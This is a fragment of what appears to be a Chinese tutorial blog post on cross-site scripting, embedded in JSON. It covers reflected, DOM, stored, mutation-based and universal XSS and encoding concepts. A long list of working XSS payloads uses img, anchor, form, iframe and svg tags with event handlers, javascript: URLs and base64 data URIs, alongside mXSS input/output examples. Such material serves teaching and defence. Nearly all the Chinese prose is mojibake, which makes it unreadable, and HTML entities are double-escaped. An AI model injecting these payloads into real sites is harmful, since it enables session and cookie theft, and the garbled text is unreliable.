","date":"2019-03-13T00:57:46Z","permalink":"https://blog.zeddyu.info/2019/03/13/Web%E5%AE%89%E5%85%A8%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B-XSS-II/","title":"Webå®‰å…¨ä»é›¶å¼€å§‹-XSS II"},{"content":"è¿™æ˜¯è‡ªå·±å†™çš„ Web å®‰å…¨ä»é›¶å¼€å§‹ç³»åˆ—ä¹‹ XSS ç¯‡ã€‚åŸæœ¬æƒ³ä¸€ç¯‡è®²å®Œï¼Œç»“æœå‘ç°å®åœ¨å¤ªå¤šäº†ï¼Œå®åœ¨è®²ä¸å®Œï¼Œå°±åˆ†ç¯‡æ¥è®²å§ã€‚ç¬¬ä¸€ç¯‡è®²è§£åŸºæœ¬çš„ XSS æ”»å‡»ï¼Œåˆ†ç±»ä¸ç¼–ç ï¼Œæ·±å…¥ç†è§£æµè§ˆå™¨è§£ææµç¨‹ã€‚\n[TOC]\nWhat is XSS æ¦‚è¿°  â€‹\tè·¨ç«™è„šæœ¬ï¼ˆè‹±è¯­ï¼šCross-site scriptingï¼Œé€šå¸¸ç®€ç§°ä¸ºï¼šXSSï¼‰æ˜¯ä¸€ç§ç½‘ç«™åº”ç”¨ç¨‹åºçš„å®‰å…¨æ¼æ´æ”»å‡»ï¼Œæ˜¯ä»£ç æ³¨å…¥çš„ä¸€ç§ã€‚å®ƒå…è®¸æ¶æ„ç”¨æˆ·å°†ä»£ç æ³¨å…¥åˆ°ç½‘é¡µä¸Šï¼Œå…¶ä»–ç”¨æˆ·åœ¨è§‚çœ‹ç½‘é¡µæ—¶å°±ä¼šå—åˆ°å½±å“ã€‚è¿™ç±»æ”»å‡»é€šå¸¸åŒ…å«äº†HTMLä»¥åŠç”¨æˆ·ç«¯è„šæœ¬è¯­è¨€ã€‚\nXSSæ”»å‡»é€šå¸¸æŒ‡çš„æ˜¯é€šè¿‡åˆ©ç”¨ç½‘é¡µå¼€å‘æ—¶ç•™ä¸‹çš„æ¼æ´ï¼Œé€šè¿‡å·§å¦™çš„æ–¹æ³•æ³¨å…¥æ¶æ„æŒ‡ä»¤ä»£ç åˆ°ç½‘é¡µï¼Œä½¿ç”¨æˆ·åŠ è½½å¹¶æ‰§è¡Œæ”»å‡»è€…æ¶æ„åˆ¶é€ çš„ç½‘é¡µç¨‹åºã€‚è¿™äº›æ¶æ„ç½‘é¡µç¨‹åºé€šå¸¸æ˜¯JavaScriptï¼Œä½†å®é™…ä¸Šä¹Ÿå¯ä»¥åŒ…æ‹¬Javaï¼ŒVBScriptï¼ŒActiveXï¼ŒFlashæˆ–è€…ç”šè‡³æ˜¯æ™®é€šçš„HTMLã€‚æ”»å‡»æˆåŠŸåï¼Œæ”»å‡»è€…å¯èƒ½å¾—åˆ°æ›´é«˜çš„æƒé™ï¼ˆå¦‚æ‰§è¡Œä¸€äº›æ“ä½œï¼‰ã€ç§å¯†ç½‘é¡µå†…å®¹ã€ä¼šè¯å’Œcookieç­‰å„ç§å†…å®¹ã€‚\n æˆå›  é€šè¿‡åœ¨ç”¨æˆ·ç«¯æ³¨å…¥æ¶æ„çš„å¯æ‰§è¡Œè„šæœ¬ï¼Œè‹¥æœåŠ¡å™¨å¯¹ç”¨æˆ·çš„è¾“å…¥ä¸è¿›è¡Œå¤„ç†æˆ–å¤„ç†ä¸ä¸¥ï¼Œåˆ™æµè§ˆå™¨å°±ä¼šç›´æ¥æ‰§è¡Œç”¨æˆ·æ³¨å…¥çš„è„šæœ¬ã€‚\nå±å®³ æ”»å‡»è€…é€šè¿‡Webåº”ç”¨ç¨‹åºå‘é€æ¶æ„ä»£ç ï¼Œä¸€èˆ¬ä»¥æµè§ˆå™¨è„šæœ¬çš„å½¢å¼å‘é€ç»™ä¸åŒçš„ç»ˆç«¯ç”¨æˆ·ã€‚å½“ä¸€ä¸ªWebç¨‹åºçš„ç”¨æˆ·è¾“å…¥ç‚¹æ²¡æœ‰è¿›è¡Œæ ¡éªŒå’Œç¼–ç ï¼Œå°†å¾ˆå®¹æ˜“çš„å¯¼è‡´ XSS ã€‚\n ç½‘ç»œé’“é±¼ï¼ŒåŒ…æ‹¬è·å–å„ç±»ç”¨æˆ·è´¦å·ï¼› çªƒå–ç”¨æˆ· cookies èµ„æ–™ï¼Œä»è€Œè·å–ç”¨æˆ·éšç§ä¿¡æ¯ï¼Œæˆ–åˆ©ç”¨ç”¨æˆ·èº«ä»½è¿›ä¸€æ­¥å¯¹ç½‘ç«™æ‰§è¡Œæ“ä½œï¼› åŠ«æŒç”¨æˆ·ï¼ˆæµè§ˆå™¨ï¼‰ä¼šè¯ï¼Œä»è€Œæ‰§è¡Œä»»æ„æ“ä½œï¼Œä¾‹å¦‚éæ³•è½¬è´¦ã€å¼ºåˆ¶å‘è¡¨æ—¥å¿—ã€ç”µå­é‚®ä»¶ç­‰ï¼› å¼ºåˆ¶å¼¹å‡ºå¹¿å‘Šé¡µé¢ã€åˆ·æµé‡ç­‰ï¼› ç½‘é¡µæŒ‚é©¬ï¼› è¿›è¡Œæ¶æ„æ“ä½œï¼Œå¦‚ä»»æ„ç¯¡æ”¹é¡µé¢ä¿¡æ¯ã€åˆ é™¤æ–‡ç« ç­‰ï¼› è¿›è¡Œå¤§é‡çš„å®¢æˆ·ç«¯æ”»å‡»ï¼Œå¦‚ddosç­‰ï¼› è·å–å®¢æˆ·ç«¯ä¿¡æ¯ï¼Œå¦‚ç”¨æˆ·çš„æµè§ˆå†å²ã€çœŸå®ipã€å¼€æ”¾ç«¯å£ç­‰ï¼› æ§åˆ¶å—å®³è€…æœºå™¨å‘å…¶ä»–ç½‘ç«™å‘èµ·æ”»å‡»ï¼› ç»“åˆå…¶ä»–æ¼æ´ï¼Œå¦‚csrf,å®æ–½è¿›ä¸€æ­¥å±å®³ï¼› æå‡ç”¨æˆ·æƒé™ï¼ŒåŒ…æ‹¬è¿›ä¸€æ­¥æ¸—é€ç½‘ç«™ï¼› ä¼ æ’­è·¨ç«™è„šæœ¬è •è™«ç­‰  æ˜“äº§ç”ŸXSSçš„åœ°æ–¹  æ•°æ®äº¤äº’çš„åœ°æ–¹  getã€postã€cookiesã€headers åé¦ˆä¸æµè§ˆ å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ å„ç±»æ ‡ç­¾æ’å…¥å’Œè‡ªå®šä¹‰   æ•°æ®è¾“å‡ºçš„åœ°æ–¹  ç”¨æˆ·èµ„æ–™ å…³é”®è¯ã€æ ‡ç­¾ã€è¯´æ˜ æ–‡ä»¶ä¸Šä¼     Kinds of XSS Reflected XSS Attacks ä»‹ç» Reflected XSS Attacks åå°„å‹ XSS æ”»å‡»ï¼Œæœ‰äº›åœ°æ–¹ä¹Ÿç§°ä¸ºéæŒç»­æ€§ XSS ï¼Œè¿™ç§æ”»å‡»æ–¹å¼å¾€å¾€å…·æœ‰ä¸€æ¬¡æ€§ï¼Œåªåœ¨ç”¨æˆ·å•å‡»æ—¶è§¦å‘ã€‚å› ä¸º payload åœ¨è§¦å‘æ—¶ï¼Œæ˜¯å®¢æˆ·ç«¯æ¸²æŸ“äº†æœåŠ¡å™¨å“åº”ä½“ï¼Œpayload ç»è¿‡äº†æœåŠ¡å™¨ï¼Œæ˜¯ä¸æœåŠ¡å™¨äº§ç”Ÿäº†äº¤äº’äº†çš„ã€‚\nå¸¸è§æ³¨å…¥ç‚¹ ç½‘ç«™çš„æœç´¢æ ã€ç”¨æˆ·ç™»å½•å…¥å£ã€è¾“å…¥è¡¨å•ç­‰åœ°æ–¹ï¼Œå¸¸ç”¨æ¥çªƒå–å®¢æˆ·ç«¯cookiesæˆ–é’“é±¼æ¬ºéª—ã€‚\næ”»å‡»æ–¹å¼ æ”»å‡»è€…é€šè¿‡ç”µå­é‚®ä»¶ç­‰æ–¹å¼å°†åŒ…å«XSSä»£ç çš„æ¶æ„é“¾æ¥å‘é€ç»™ç›®æ ‡ç”¨æˆ·ã€‚å½“ç›®æ ‡ç”¨æˆ·è®¿é—®è¯¥é“¾æ¥æ—¶ï¼ŒæœåŠ¡å™¨æ¥å—è¯¥ç›®æ ‡ç”¨æˆ·çš„è¯·æ±‚å¹¶è¿›è¡Œå¤„ç†ï¼Œç„¶åæœåŠ¡å™¨æŠŠå¸¦æœ‰XSSçš„ä»£ç å‘é€ç»™ç›®æ ‡ç”¨æˆ·çš„æµè§ˆå™¨ï¼Œæµè§ˆå™¨è§£æè¿™æ®µå¸¦æœ‰XSSä»£ç çš„æ¶æ„è„šæœ¬åï¼Œå°±ä¼šè§¦å‘XSSæ¼æ´ã€‚\nDom Based XSS Attacks ä»‹ç» DOM(Document object model)ï¼Œä½¿ç”¨ DOM èƒ½å¤Ÿä½¿ç¨‹åºå’Œè„šæœ¬èƒ½å¤ŸåŠ¨æ€è®¿é—®å’Œæ›´æ–°æ–‡æ¡£çš„å†…å®¹ã€ç»“æ„å’Œæ ·å¼ã€‚\nDOMå‹XSSå…¶å®æ˜¯ä¸€ç§ç‰¹æ®Šç±»å‹çš„åå°„å‹XSSï¼Œå®ƒæ˜¯åŸºäºDOMæ–‡æ¡£å¯¹è±¡çš„ä¸€ç§æ¼æ´ã€‚DOMå‹XSSæ˜¯åŸºäºjsä¸Šçš„ã€‚ä¸éœ€è¦ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’ã€‚\næ³¨å…¥ç‚¹ é€šè¿‡jsè„šæœ¬å¯¹å¯¹æ–‡æ¡£å¯¹è±¡è¿›è¡Œç¼–è¾‘ï¼Œä»è€Œä¿®æ”¹é¡µé¢çš„å…ƒç´ ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå®¢æˆ·ç«¯çš„è„šæœ¬ç¨‹åºå¯ä»¥DOMåŠ¨æ€ä¿®æ”¹é¡µé¢çš„å†…å®¹ï¼Œä»å®¢æˆ·ç«¯è·å–DOMä¸­çš„æ•°æ®å¹¶åœ¨æœ¬åœ°æ‰§è¡Œã€‚ç”±äºDOMæ˜¯åœ¨å®¢æˆ·ç«¯ä¿®æ”¹èŠ‚ç‚¹çš„ï¼Œæ‰€ä»¥åŸºäºDOMå‹çš„XSSæ¼æ´ä¸éœ€è¦ä¸æœåŠ¡å™¨dç«¯äº¤äº’ï¼Œå®ƒåªå‘ç”Ÿåœ¨å®¢æˆ·ç«¯å¤„ç†æ•°æ®çš„é˜¶æ®µã€‚\næ”»å‡»æ–¹å¼ ç”¨æˆ·è¯·æ±‚ä¸€ä¸ªç»è¿‡ä¸“é—¨è®¾è®¡çš„URLï¼Œå®ƒç”±æ”»å‡»è€…æä¾›ï¼Œè€Œä¸”å…¶ä¸­åŒ…å«XSSä»£ç ã€‚æœåŠ¡å™¨çš„å“åº”ä¸ä¼šä»¥ä»»ä½•å½¢å¼åŒ…å«æ”»å‡»è€…çš„è„šæœ¬ï¼Œå½“ç”¨æˆ·çš„æµè§ˆå™¨å¤„ç†è¿™ä¸ªå“åº”æ—¶ï¼ŒDOMå¯¹è±¡å°±ä¼šå¤„ç†XSSä»£ç ï¼Œå¯¼è‡´å­˜åœ¨XSSæ¼æ´ã€‚\nStored XSS Attacks ä»‹ç» Stored XSS Attacks æŒä¹…å‹XSSï¼Œæ¯”åå°„å‹XSSæ›´å…·æœ‰å¨èƒæ€§ï¼Œå¹¶ä¸”å¯èƒ½å½±å“åˆ°WebæœåŠ¡å™¨è‡ªèº«çš„å®‰å…¨ã€‚æ”»å‡»è„šæœ¬å°†è¢«æ°¸ä¹…çš„å­˜æ”¾åœ¨ç›®æ ‡æœåŠ¡å™¨çš„æ•°æ®åº“æˆ–æ–‡ä»¶ä¸­ã€‚\nå¸¸è§æ³¨å…¥ç‚¹ è®ºå›ã€åšå®¢ã€ç•™è¨€æ¿ã€ç½‘ç«™çš„ç•™è¨€ã€è¯„è®ºã€æ—¥å¿—ç­‰äº¤äº’å¤„ã€‚\næ”»å‡»æ–¹å¼ æ”»å‡»è€…åœ¨å‘å¸–æˆ–ç•™è¨€çš„è¿‡ç¨‹ä¸­ï¼Œå°†æ¶æ„è„šæœ¬è¿åŒæ­£å¸¸ä¿¡æ¯ä¸€èµ·æ³¨å…¥åˆ°å‘å¸ƒå†…å®¹ä¸­ã€‚éšç€å‘å¸ƒå†…å®¹è¢«æœåŠ¡å™¨å­˜å‚¨ä¸‹æ¥ï¼Œæ¶æ„è„šæœ¬ä¹Ÿå°†æ°¸ä¹…çš„å­˜æ”¾åˆ°æœåŠ¡å™¨çš„åç«¯å­˜å‚¨å™¨ä¸­ã€‚å½“å…¶ä»–ç”¨æˆ·æµè§ˆè¿™ä¸ªè¢«æ³¨å…¥äº†æ¶æ„è„šæœ¬çš„å¸–å­æ—¶ï¼Œæ¶æ„è„šæœ¬å°±ä¼šåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­å¾—åˆ°æ‰§è¡Œã€‚\nMXSS Attacks ä»‹ç» ä¸è®ºæ˜¯æœåŠ¡å™¨ç«¯æˆ–å®¢æˆ·ç«¯çš„XSSè¿‡æ»¤å™¨ï¼Œéƒ½è®¤å®šè¿‡æ»¤åçš„HTMLæºä»£ç åº”è¯¥ä¸æµè§ˆå™¨æ‰€æ¸²æŸ“åçš„HTMLä»£ç ä¿æŒä¸€è‡´ï¼Œè‡³å°‘ä¸ä¼šå‡ºç°å¾ˆå¤§çš„å‡ºå…¥ã€‚ç„¶è€Œï¼Œå¦‚æœç”¨æˆ·æ‰€æä¾›çš„å¯Œæ–‡æœ¬å†…å®¹é€šè¿‡ javascript ä»£ç è¿›å±æ€§åï¼Œä¸€äº›æ„å¤–çš„å˜åŒ–ä¼šä½¿å¾—è¿™ä¸ªè®¤å®šä¸å†æˆç«‹ï¼šä¸€ä¸²çœ‹ä¼¼æ²¡æœ‰ä»»ä½•å±å®³çš„HTMLä»£ç ï¼Œå°†é€ƒè¿‡XSSè¿‡æ»¤å™¨çš„æ£€æµ‹ï¼Œæœ€ç»ˆè¿›å…¥æŸä¸ªDOMèŠ‚ç‚¹ä¸­ï¼Œæµè§ˆå™¨çš„æ¸²æŸ“å¼•æ“ä¼šå°†æœ¬æ¥æ²¡æœ‰ä»»ä½•å±å®³çš„HTMLä»£ç æ¸²æŸ“æˆå…·æœ‰æ½œåœ¨å±é™©çš„XSSæ”»å‡»ä»£ç ã€‚éšåï¼Œè¯¥æ®µæ”»å‡»ä»£ç ï¼Œå¯èƒ½ä¼šè¢«JSä»£ç ä¸­çš„å…¶å®ƒä¸€äº›æµç¨‹è¾“å‡ºåˆ°DOMä¸­æˆ–æ˜¯å…¶å®ƒæ–¹å¼è¢«å†æ¬¡æ¸²æŸ“ï¼Œä»è€Œå¯¼è‡´XSSçš„æ‰§è¡Œã€‚ è¿™ç§ç”±äºHTMLå†…å®¹è¿›åå‘ç”Ÿæ„å¤–å˜åŒ–ï¼ˆmutationï¼Œçªå˜ï¼Œæ¥è‡ªé—ä¼ å­¦çš„ä¸€ä¸ªå•è¯ï¼Œå¤§å®¶éƒ½çŸ¥é“çš„åŸºå› çªå˜ï¼Œgene mutationï¼‰ï¼Œè€Œæœ€ç»ˆå¯¼è‡´XSSçš„æ”»å‡»æµç¨‹ï¼Œè¢«ç§°ä¸ºçªå˜XSSï¼ˆmXSS, Mutation-based Cross-Site-Scriptingï¼‰ã€‚\n \nå¸¸è§æ³¨å…¥ç‚¹ åå¼•å·æ‰“ç ´å±æ€§è¾¹ç•Œå¯¼è‡´çš„ mXSS Input:\n\u0026lt;img src=\u0026#34;test.jpg\u0026#34; alt =\u0026#34;``onload=xss()\u0026#34; /\u0026gt; Output:\n\u0026lt;IMG alt =``onload=xss() src =\u0026#34;test.jpg\u0026#34;\u0026gt; æœªçŸ¥å…ƒç´ ä¸­çš„ xmlns å±æ€§æ‰€å¯¼è‡´çš„ mXSS ä¸€äº›æµè§ˆå™¨ä¸æ”¯æŒHTML5çš„æ ‡è®°ï¼Œä¾‹å¦‚IE8ï¼Œä¼šå°†articleï¼Œasideï¼Œmenuç­‰å½“ä½œæ˜¯æœªçŸ¥çš„HTMLæ ‡ç­¾ã€‚å¯ä»¥é€šè¿‡è®¾ç½®è¿™äº›æ ‡ç­¾çš„xmlns å±æ€§ï¼Œè®©æµè§ˆå™¨çŸ¥é“è¿™äº›æœªçŸ¥çš„æ ‡ç­¾æ˜¯çš„XMLå‘½åç©ºé—´æ˜¯ä»€ä¹ˆã€‚ä½†è§£é‡Šåå´äº§ç”Ÿäº†çªå˜ï¼š\nInput:\n\u0026lt;pkav xmlns=\u0026#34;\u0026gt;\u0026lt;iframe onload=alert(1)\u0026#34;\u0026gt;123\u0026lt;/pkav\u0026gt; Output:\n\u0026lt;?XML:NAMESPACE PREFIX = [default] \u0026gt;\u0026lt;iframe onload=alert(1) NS = \u0026#34;\u0026gt;\u0026lt;iframe onload=alert(1)\u0026#34; /\u0026gt;\u0026lt;pkav xmlns=\u0026#34;\u0026gt;\u0026lt;iframe onload=alert(1)\u0026#34;\u0026gt;123\u0026lt;/pkav\u0026gt; CSSä¸­åæ–œçº¿è½¬ä¹‰å¯¼è‡´çš„mXSS cssä¸­å…è®¸ä½¿ç”¨\\æ¥è¿›è¡Œè½¬ä¹‰ï¼Œä½†åœ¨åœ¨ä¸€èµ·çš„æ—¶å€™ï¼Œæ‚²å‰§å°±äº§ç”Ÿäº†ã€‚\nInput:\n\u0026lt;p style=\u0026#34;font-family:\u0026#39;ar\\27 \\3bx\\3a expression\\28xss\\28\\29\\29\\3bial\u0026#39;;\u0026#34;\u0026gt;\u0026lt;/p\u0026gt; Output:\n\u0026lt;P style=\u0026#34;FONT-FAMILY: \u0026#39;ar\u0026#39;;x:xss());ial\u0026#39;\u0026#34;\u0026gt;\u0026lt;/P\u0026gt; CSSå±æ€§åä¸­çš„è½¬ä¹‰æ‰€å¯¼è‡´çš„mXSS \\22è½¬ä¹‰åäº§ç”Ÿçš„æ‚²å‰§ã€‚\nInput\n\u0026lt;img src=1 style=\u0026#34;font-fam\\22onerror\\3d alert\\28 1\\29\\20 ily:\u0026#39;aaa\u0026#39;;\u0026#34;\u0026gt; Output\n\u0026lt;IMG style=\u0026#34;font-fam\u0026#34;alert(1) ily: \u0026#39;\u0026#39;\u0026#34; src=\u0026#34;1\u0026#34;\u0026gt; Listingæ ‡ç­¾å¯¼è‡´çš„mXSS Listingæ ‡ç­¾é‡Œé¢çš„ä¸œä¸œä¼šå‘ç”Ÿäº›å¥‡è‘©äº‹æƒ…ï¼š\nInput\n\u0026lt;listing\u0026gt;\u0026lt;img src=1 onerror=alert(1) \u0026amp;\u0026lt;/listing\u0026gt; Output\n\u0026lt;LISTING\u0026gt;\u0026lt;img src=1 onerror=alert(1) \u0026gt;\u0026lt;/LISTING\u0026gt; UXSS ä»‹ç» UXSS å…¨ç§° Universal Cross-Site Scriptingï¼Œç¿»è¯‘è¿‡æ¥å°±æ˜¯é€šç”¨å‹XSSï¼Œä¹Ÿå«Universal XSSã€‚UXSSä¿ç•™äº†åŸºæœ¬XSSçš„ç‰¹ç‚¹ï¼Œåˆ©ç”¨æ¼æ´ï¼Œæ‰§è¡Œæ¶æ„ä»£ç ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªé‡è¦çš„åŒºåˆ«ï¼š\nä¸åŒäºå¸¸è§çš„XSSï¼ŒUXSSæ˜¯ä¸€ç§åˆ©ç”¨æµè§ˆå™¨æˆ–è€…æµè§ˆå™¨æ‰©å±•æ¼æ´æ¥åˆ¶é€ äº§ç”ŸXSSçš„æ¡ä»¶å¹¶æ‰§è¡Œä»£ç çš„ä¸€ç§æ”»å‡»ç±»å‹ã€‚\nä¿—çš„è¯´ï¼Œå°±æ˜¯åŸæ¥æˆ‘ä»¬è¿›è¡ŒXSSæ”»å‡»ç­‰éƒ½æ˜¯é’ˆå¯¹Webåº”ç”¨æœ¬èº«ï¼Œæ˜¯å› ä¸ºWebåº”ç”¨æœ¬èº«å­˜åœ¨æ¼æ´æ‰èƒ½è¢«æˆ‘ä»¬åˆ©ç”¨æ”»å‡»ï¼›è€ŒUXSSä¸åŒçš„æ˜¯é€šè¿‡æµè§ˆå™¨æˆ–è€…æµè§ˆå™¨æ‰©å±•çš„æ¼æ´æ¥\u0026quot;åˆ¶ä½œXSSæ¼æ´\u0026quot;ï¼Œç„¶åå‰©ä¸‹çš„æˆ‘ä»¬å°±å¯ä»¥åƒæ™®é€šXSSé‚£æ ·åˆ©ç”¨æ”»å‡»äº†ã€‚\nè¯¦ç»†å‚è€ƒé€šç”¨è·¨ç«™è„šæœ¬æ”»å‡»(UXSS)\nPayload img \u0026lt;img src=javascript:alert(\u0026#34;xss\u0026#34;)\u0026gt; \u0026lt;IMG SRC=javascript:alert(String.formCharCode(88,83,83))\u0026gt; \u0026lt;img scr=\u0026#34;URL\u0026#34; style=\u0026#39;Xss:expression(alert(/xss));\u0026#39; \u0026lt;!--CSSæ ‡è®°xss--\u0026gt; \u0026lt;img STYLE=\u0026#34;background-image:url(javascript:alert(\u0026#39;XSS\u0026#39;))\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;x\u0026#34; onerror=alert(1)\u0026gt; \u0026lt;img src=\u0026#34;1\u0026#34; onerror=eval(\u0026#34;alert(\u0026#39;xss\u0026#39;)\u0026#34;)\u0026gt; \u0026lt;img src=1 onmouseover=alert(\u0026#39;xss\u0026#39;)\u0026gt; a \u0026lt;a href=\u0026#34;https://www.baidu.com\u0026#34;\u0026gt;baidu\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;javascript:alert(\u0026#39;xss\u0026#39;)\u0026#34;\u0026gt;aa\u0026lt;/a\u0026gt; \u0026lt;a href=javascript:eval(alert(\u0026#39;xss\u0026#39;))\u0026gt;aa\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;javascript:aaa\u0026#34; onmouseover=\u0026#34;alert(/xss/)\u0026#34;\u0026gt;aa\u0026lt;/a\u0026gt; \u0026lt;script\u0026gt;alert(\u0026#39;xss\u0026#39;)\u0026lt;/script\u0026gt; \u0026lt;a href=\u0026#34;\u0026#34; onclick=alert(\u0026#39;xss\u0026#39;)\u0026gt;aa\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;\u0026#34; onclick=eval(alert(\u0026#39;xss\u0026#39;))\u0026gt;aa\u0026lt;/a\u0026gt; \u0026lt;a href=kycg.asp?ttt=1000 onmouseover=prompt(\u0026#39;xss\u0026#39;) y=2016\u0026gt;aa\u0026lt;/a\u0026gt; input \u0026lt;input name=\u0026#34;name\u0026#34; value=\u0026#34;\u0026#34;\u0026gt; \u0026lt;input value=\u0026#34;\u0026#34; onclick=alert(\u0026#39;xss\u0026#39;) type=\u0026#34;text\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;name\u0026#34; value=\u0026#34;\u0026#34; onmouseover=prompt(\u0026#39;xss\u0026#39;) bad=\u0026#34;\u0026#34;\u0026gt; \u0026lt;input name=\u0026#34;name\u0026#34; value=\u0026#34;\u0026#34;\u0026gt;\u0026lt;script\u0026gt;alert(\u0026#39;xss\u0026#39;)\u0026lt;/script\u0026gt; form \u0026lt;form action=javascript:alert(\u0026#39;xss\u0026#39;) method=\u0026#34;get\u0026#34;\u0026gt; \u0026lt;form action=javascript:alert(\u0026#39;xss\u0026#39;)\u0026gt; \u0026lt;form method=post action=aa.asp? onmouseover=prompt(\u0026#39;xss\u0026#39;)\u0026gt; \u0026lt;form method=post action=aa.asp? onmouseover=alert(\u0026#39;xss\u0026#39;)\u0026gt; \u0026lt;form action=1 onmouseover=alert(\u0026#39;xss)\u0026gt; åˆ©ç”¨ç¼–ç \n\u0026lt;!--åŸcode--\u0026gt; \u0026lt;form method=post action=\u0026#34;data:text/html;base64,\u0026lt;script\u0026gt;alert(\u0026#39;xss\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;\u0026gt; \u0026lt;!--base64ç¼–ç --\u0026gt; \u0026lt;form method=post action=\u0026#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=\u0026#34;\u0026gt; iframe \u0026lt;iframe src=javascript:alert(\u0026#39;xss\u0026#39;);height=5width=1000 /\u0026gt;\u0026lt;iframe\u0026gt; \u0026lt;iframe src=\u0026#34;data:text/html,\u0026amp;lt;script\u0026amp;gt;alert(\u0026#39;xss\u0026#39;)\u0026amp;lt;/script\u0026amp;gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;!--åŸcode--\u0026gt; \u0026lt;iframe src=\u0026#34;data:text/html;base64,\u0026lt;script\u0026gt;alert(\u0026#39;xss\u0026#39;)\u0026lt;/script\u0026gt;\u0026#34;\u0026gt; \u0026lt;!--base64ç¼–ç --\u0026gt; \u0026lt;iframe src=\u0026#34;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=\u0026#34;\u0026gt; \u0026lt;iframe src=\u0026#34;aaa\u0026#34; onmouseover=alert(\u0026#39;xss\u0026#39;) /\u0026gt;\u0026lt;iframe\u0026gt; \u0026lt;iframe src=\u0026#34;javascript\u0026amp;colon;prompt\u0026amp;lpar;`xss`\u0026amp;rpar;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; svg \u0026lt;svg onload=alert(1)\u0026gt; sth else è¿˜æœ‰å¾ˆå¤šâ€¦è¿™é‡Œåªåˆ—ä¸¾ä¸€äº›ï¼Œå› ä¸ºæ ‡ç­¾å°±å¾ˆå¤š\nEncode Five Kinds Of HTML Elements  ç©ºå…ƒç´ (Void elements)ï¼Œå¦‚\u0026lt;area\u0026gt;/\u0026lt;br\u0026gt;/\u0026lt;base\u0026gt;ç­‰ç­‰ åŸå§‹æ–‡æœ¬å…ƒç´ (Raw text elements)ï¼Œæœ‰\u0026lt;script\u0026gt;å’Œ\u0026lt;style\u0026gt; RCDATAå…ƒç´ (RCDATA elements)ï¼Œæœ‰\u0026lt;textarea\u0026gt;å’Œ\u0026lt;title\u0026gt; å¤–éƒ¨å…ƒç´ (Foreign elements)ï¼Œä¾‹å¦‚ MathML å‘½åç©ºé—´æˆ–è€… SVG å‘½åç©ºé—´çš„å…ƒç´  åŸºæœ¬å…ƒç´ (Normal elements)ï¼Œå³é™¤äº†ä»¥ä¸Š4ç§å…ƒç´ ä»¥å¤–çš„å…ƒç´   äº”ç±»å…ƒç´ çš„åŒºåˆ«å¦‚ä¸‹ï¼š\n ç©ºå…ƒç´ ï¼Œä¸èƒ½å®¹çº³ä»»ä½•å†…å®¹ï¼ˆå› ä¸ºå®ƒä»¬æ²¡æœ‰é—­åˆæ ‡ç­¾ï¼Œæ²¡æœ‰å†…å®¹èƒ½å¤Ÿæ”¾åœ¨å¼€å§‹æ ‡ç­¾å’Œé—­åˆæ ‡ç­¾ä¸­é—´ï¼‰ã€‚ åŸå§‹æ–‡æœ¬å…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬ã€‚ RCDATAå…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬å’Œå­—ç¬¦å¼•ç”¨ã€‚ å¤–éƒ¨å…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€CDATAæ®µã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Š åŸºæœ¬å…ƒç´ ï¼Œå¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Š  URL Enocde ä¸€ä¸ªç™¾åˆ†å·å’Œè¯¥å­—ç¬¦çš„ ASCII ç¼–ç æ‰€å¯¹åº”çš„2ä½åå…­è¿›åˆ¶æ•°å­—ï¼Œä¾‹å¦‚/çš„URLç¼–ç ä¸º %2F (ä¸€èˆ¬å¤§å†™ï¼Œä½†ä¸å¼ºæ±‚)\nCharacter Entity åœ¨å‘ˆç° HTML é¡µé¢æ—¶ï¼Œé’ˆå¯¹æŸäº›ç‰¹æ®Šå­—ç¬¦å¦‚\u0026lt;æˆ–\u0026gt;ç›´æ¥ä½¿ç”¨ï¼Œæµè§ˆå™¨ä¼šè¯¯ä»¥ä¸ºå®ƒä»¬æ ‡ç­¾çš„å¼€å§‹æˆ–ç»“æŸï¼Œè‹¥æƒ³æ­£ç¡®çš„åœ¨ HTML é¡µé¢å‘ˆç°ç‰¹æ®Šå­—ç¬¦å°±éœ€è¦ç”¨åˆ°å…¶å¯¹åº”çš„å­—ç¬¦å®ä½“ã€‚\nå­—ç¬¦å®ä½“æ˜¯ä¸€ä¸ªé¢„å…ˆå®šä¹‰å¥½çš„è½¬ä¹‰åºåˆ—ï¼Œå®ƒå®šä¹‰äº†ä¸€äº›æ— æ³•åœ¨æ–‡æœ¬å†…å®¹ä¸­è¾“å…¥çš„å­—ç¬¦æˆ–ç¬¦å·ã€‚\nè€Œä¸”æ¯”è¾ƒé‡è¦çš„æœ‰ï¼š\n â€‹\tè¿™é‡Œæœ‰ä¸‰ç§æƒ…å†µå¯ä»¥å®¹çº³å­—ç¬¦å®ä½“ï¼Œ\u0026ldquo;æ•°æ®çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨\u0026rdquo;ï¼Œ\u0026ldquo;RCDATAçŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨\u0026quot;å’Œ\u0026quot;å±æ€§å€¼çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨\u0026rdquo;ã€‚åœ¨è¿™äº›çŠ¶æ€ä¸­HTMLå­—ç¬¦å®ä½“å°†ä¼šä»â€œ\u0026amp;#\u0026hellip;â€å½¢å¼è§£ç ï¼Œå¯¹åº”çš„è§£ç 